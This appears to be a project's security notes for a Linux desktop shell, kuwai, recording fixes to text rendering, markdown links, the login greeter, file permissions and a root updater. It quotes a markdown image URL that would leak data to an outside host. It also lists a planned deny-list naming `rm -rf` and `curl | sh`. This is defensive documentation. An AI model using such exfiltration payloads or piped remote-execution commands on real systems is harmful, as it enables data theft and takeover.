# Security notes (kuwai / rice shell)

Last reviewed: 2026-11-17.

## 2026-11-17 review

| Area | What was wrong | Now |
|------|----------------|-----|
| **Text from outside** | Qt's `Text` treats a string that looks like HTML as HTML and fetches any `<img>` in it (checked on Qt 6.12: default `Text`, `StyledText`, `TextEdit` Markdown and RichText all made the request). A song or tab title on the screensaver, a device name in the HUD, tool output and model reasoning in the assistant reached such elements | Every `Text` with outside text says `textFormat: Text.PlainText` (103 elements); `tests/security/test_text_format.py` fails CI on a new one |
| **Streaming answers** | The live block of an answer went to Qt's Markdown reader as written: `![x](https://host/?data)` was fetched as it arrived | `Turn.liveMarkdown`: an image becomes a link, raw HTML shows as text (`turn.test.mjs`) |
| **Links** | A link in an answer or a copied text was opened whatever its scheme | The web and mail only (`Turn.safeLink`, `rice_md.py`, Quick Look) |
| **Login screen** | `/var/lib/kuwai-greeter` was the user's, and `greeter/sync` copied the shell into it at every login: a program running as you could rewrite the code that takes the login password | The code is root's (`sudo greeter/install`, `--code` after an update); you write only `home/` (wallpaper, colours, settings, name, face). **Needs one `sudo greeter/install --code`** on a machine installed before this date; until then sync keeps the old layout working and says so |
| **Login screen, undo** | `--undo` didn't put PAM, greetd's config or tty1's override back, and assumed SDDM | What was replaced is kept in `/var/lib/kuwai-greeter/original` and restored |
| **State on disk** | Notification bodies and chats were written 0644 | `~/.local/state/rice`, `~/.cache/rice`, `~/.config/rice` are 0700 at every shell start |

Still open: the assistant's tool execution has not had an outside review; the
root updater installs its helper from the repo copy on first use (the prompt
shows `/bin/sh`); nothing here replaces disk encryption (see the audit notes).

## Fixed / hardened in this track

| Area | Mitigation |
|------|------------|
| **rice-notify** | `-H` keys restricted to `x-rice-*`; values JSON-escaped via `jq`; argv for title/body/app |
| **Usage limit moments** | Read-only `rice-usage`; labels shown as text in the island, no notifications sent |
| **Crash alerts** | Brief truncated; uses rice-notify + adapter gate for diagnose action |
| **Root updater** | Hostile requests refused before anything is touched (`tests/root`: bad paths and names, and real symlinks in a stand-in /etc); no shell interpolation. Not fuzzed, and no privileged transaction is run in tests |
| **Assistant files** | Searches follow the same secrets rule as reads; sandbox job and attachment files are opened without following links (`tests/agent/test_file_policy.py`, `test_sandbox_boundary.py`) |
| **Installer** | Uninstall restores the state before the first install; replacements never write through a link (`tests/install`) |

## Known gaps (Phase 6 — do before assistant default-on)

| Risk | Status | Mitigation planned |
|------|--------|-------------------|
| **Assistant tool exec** | Ollama sandbox exists; not fully audited | Deny-list `sudo`, `rm -rf`, `curl \| sh`; confirm dangerous commands |
| **Idle.qml `sh -c`** | Fixed commands only | Keep audit when adding idle hooks |
| **Launcher xdg-open** | User-driven search | URLs encoded; no auto-exec of pasted shell |
| **notify-send fallback** | kuwai session restore only | Prefer rice-notify |

## Flaky behaviour to watch

| Symptom | Cause | Fix |
|---------|-------|-----|
| Welcome back pill empty on the right | `away` was blank for short unlocks; moment split label/value across island sides | Fixed: unified hello row + “Unlocked” when <1 min |
| Notch stuck after fast unlock | Welcome moment queued behind another; island width min 220 | Hello cuts in; +520 ms delay after unlock anim |
| Volume HUD looks unlike notch | OSD is a separate layer but **morphs from island width** when `Settings.bar === island`; lock/greeter use **LockOsd** (bottom pill) | Session: island bar + `brightness.sh watch --part osd`; greeter: brightness only without PipeWire user |
| F7/F8 do nothing | Binds only existed when `~/Scripts/brightness.sh` present | Now fall back to `brightnessctl` always |
| No WhatsApp toasts | DND, shell down, ZapZap backend disabled | `rice doctor`; restart ZapZap after shell outage |
| Double notifications | Hot reload + keepOnReload | By design; dismiss duplicates |
| Limit alert on every reload | Restart | What was said is kept in `~/.local/state/rice/limits-told.json` (once per window per reset) |
| Memory >450 MB after reload | Quickshell hot reload | `rice-check`; restart shell if over budget |
| `notify-send` broken | libnotify | All kuwai/shell paths use `rice-notify` |

Run **`bin/rice doctor`** after promote or when notifications feel dead.
